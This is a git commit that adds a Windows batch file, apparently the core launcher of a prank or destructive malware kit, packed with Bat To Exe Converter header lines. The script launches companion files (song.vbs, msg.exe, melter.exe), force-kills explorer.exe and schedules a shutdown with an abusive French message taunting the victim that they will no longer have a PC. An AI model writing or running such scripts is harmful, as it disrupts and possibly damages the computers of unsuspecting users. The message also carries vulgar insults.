5172db0ba338b5a4acad7d3003ca76c5b2d2ba23
Chaxiraxi <58859587+Chaxiraxi@users.noreply.github.com>
2020-10-10 10:41:25 +0200

    Add files via upload

---
+++ Source Code/core.bat
@@ -0,0 +1,40 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFDhcTRyLLmqiD4k47fvw++WXnmAUWuc8ao7dzvSNMuEQ4XnXeoM/1X8au8QICSdRfR2lIAY3pg4=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSzk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJiZks0
+::ZQ05rAF9IBncCkqN+0xwdVsGAlTi
+::ZQ05rAF9IAHYFVzEqQIRLBRWSUSxKWKuA/U/+un45Io=
+::eg0/rx1wNQPfEVWB+kM9LVsJDCWGM2m/RoYJ4fz+r8mVo04WNA==
+::fBEirQZwNQPfEVWB+kM9LVsJDCWGM2m/RoYJ4fz+r8mVo04WNA==
+::cRolqwZ3JBvQF1fEqQIRLBRWSUSxKX+zA/U/+un45Io=
+::dhA7uBVwLU+EWHqW9UE7IRVTDDSQM2yoB7hcy+f2/+uJuy0=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFDhcTRyLLmqiD4k47fvw++WXnmAUWuc8ao7dzvSNMuEQ4XnXeoM/1X8au8QICSdbcQCuIAosrA4=
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+start song.vbs
+timeout /t 15 /nobreak>nul
+start msg.exe
+timeout /t 2 /nobreak>nul
+taskkill /F /IM explorer.exe
+start melter.exe
+shutdown -s -t 300 -c "Dans 5 Minutes tu n'a plus de PC fils de viol , le 18-25 t'a bien baiser le cul :)"
